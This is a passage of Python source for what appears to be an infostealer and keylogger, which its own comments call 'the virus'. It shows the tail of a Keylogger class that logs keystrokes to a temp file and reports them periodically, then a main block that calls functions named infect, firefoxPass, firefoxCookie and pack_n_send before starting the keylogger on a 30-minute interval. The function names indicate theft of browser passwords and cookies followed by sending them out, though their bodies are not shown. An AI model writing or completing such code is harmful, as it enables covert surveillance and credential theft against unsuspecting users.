        # and then the program creates a new one
        if os.path.exists(f'{os.getenv("LOCALAPPDATA")}\\Temp\\{self.HOSTNAME}.txt'):
            report_file(f'{os.getenv("LOCALAPPDATA")}\\Temp\\{self.HOSTNAME}.txt')
        self.create_logfile()

        # on every keyboard key release the callback method is called
        on_release(callback=self.callback)

        # start reporting
        self.report()

        # waiting for child processes to execute, basically makes the virus block its tread and live in it,
        # until pc shuts down or program gets noticed and user kills process
        wait()


# calling all methods
if __name__ == "__main__":
    infect()
    collect_data()
    extract()
    firefoxPass()
    firefoxCookie()
    pack_n_send()

    keylogger = Keylogger(interval=1800, hostname=node())

    keylogger.start_logging()
